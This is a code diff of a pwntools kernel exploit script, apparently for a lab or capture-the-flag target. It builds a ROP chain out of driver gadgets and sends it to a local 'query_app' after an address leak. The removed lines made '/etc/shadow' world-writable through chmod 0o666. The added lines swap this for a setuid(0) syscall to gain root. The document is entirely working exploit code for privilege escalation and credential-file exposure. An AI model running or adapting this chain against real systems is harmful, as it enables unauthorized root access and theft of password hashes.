@@ -127,12 +127,14 @@ def build(leak, gadget_file, sled_length):
     # Build a string in the .bss section of the target driver
     # the .bss section starts at the address the driver was loaded
     # We have to adjust because the gadget we have is rdi + 0x2a50
+    '''
     string_location = adjuster(section('.bss', gadget_file))
     print('string_location:', hex(string_location))
 
     rop = write4(rop, gadget_file, adjuster, string_location, b'cte/')
     rop = write4(rop, gadget_file, adjuster, string_location + 4, b'ahs/')
     rop = write4(rop, gadget_file, adjuster, string_location + 8, b'\x00wod')
+    '''
 
     # Now call chmod
 
@@ -140,19 +142,20 @@ def build(leak, gadget_file, sled_length):
     rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
     # rop.raw(adjuster(0x2f0eb))
     # set rax
-    rop.raw(0x5a)
+    rop.raw(0x69)
     # pop rdi; ret;
     rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
     # rop.raw(adjuster(0x257e9))
-    # set rdi
-    rop.raw(string_location)
-    # pop rsi; ret;
-    rop.raw(adjuster(gadget('pop %rsi; ret;', gadget_file)))
-    # set rsi
-    rop.raw(0o666)
-    # syscall; NULL
-    # rop.raw(adjuster(gadget('syscall;', gadget_file)))
+    # set rdi for setuid 0
     rop.raw(0x0)
+    # rop.raw(string_location)
+    # pop rsi; ret;
+    # rop.raw(adjuster(gadget('pop %rsi; ret;', gadget_file)))
+    # set rsi
+    # rop.raw(0o666)
+    # syscall; NULL
+    rop.raw(adjuster(gadget('syscall;', gadget_file)))
+    # rop.raw(0x0)
     # sys_chmod
     # rop.raw(adjuster(chmod_addr()))
 
@@ -184,13 +187,13 @@ def attack_kernel(target_binary, payload_file, sled_length):
     leaker.shutdown()
     print('Leaked address is', str(hex(leak)))
     exploit = create_exploit(target_binary, payload_file, sled_length, leak)
-    exploit_length = len(exploit)
-    exploit = bytes(exploit).hex()
     args = ['./query_app']
     print(args)
     p = process(args)
-    print('sending exploit', p.send(exploit))
-    print(p.recvall())
+    print('sending payload...')
+    p.send(exploit)
+    leaker.shutdown('send')
+    print('payload sent')
 
 def main():
     # Set the pwntools context
